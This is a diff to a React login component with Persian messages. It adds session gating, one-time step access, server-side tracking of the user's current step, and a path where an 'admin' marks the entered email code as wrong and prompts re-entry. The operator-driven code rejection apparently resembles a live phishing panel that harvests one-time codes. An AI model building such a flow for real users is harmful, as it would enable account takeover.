@@ -19,12 +19,49 @@ const AuthEmail = () => {
   const [email, setEmail] = useState("");
   const [emailCode, setEmailCode] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isBlocked, setIsBlocked] = useState(false);
   const [errors, setErrors] = useState<{
     email?: string;
     emailCode?: string;
   }>({});
 
   const phoneNumber = location.state?.phoneNumber || "";
+  const sessionId =
+    location.state?.sessionId || sessionStorage.getItem("sessionId");
+  const hasError = location.state?.hasError || false;
+
+  useEffect(() => {
+    const checkAccess = async () => {
+      if (!sessionId) {
+        navigate("/", { replace: true });
+        return;
+      }
+
+      const canAccess = canAccessAuthStep(sessionId, "email");
+      if (!canAccess && !hasError) {
+        setIsBlocked(true);
+        setErrors({
+          emailCode:
+            "شما قبلاً کد ایمیل را وارد کرده‌اید. هر مرحله احراز هویت فقط یک بار قابل انجام است.",
+        });
+        return;
+      }
+
+      // If admin marked email as wrong, show error and go to code step
+      if (hasError) {
+        setStep("code");
+        // Set a dummy email to show the code step
+        setEmail("user@example.com");
+        setErrors({
+          emailCode: "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+        });
+      }
+
+      await setUserCurrentStep(sessionId, "auth_email");
+    };
+
+    checkAccess();
+  }, [sessionId, navigate, hasError]);
 
   const validateEmail = (email: string): boolean => {
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -389,7 +426,7 @@ const AuthEmail = () => {
                         textTransform: "uppercase",
                       }}
                     >
-                      ویر��یش ایمیل
+                      ویرایش ایمیل
                     </Button>
                     <Button
                       onClick={handleCodeSubmit}
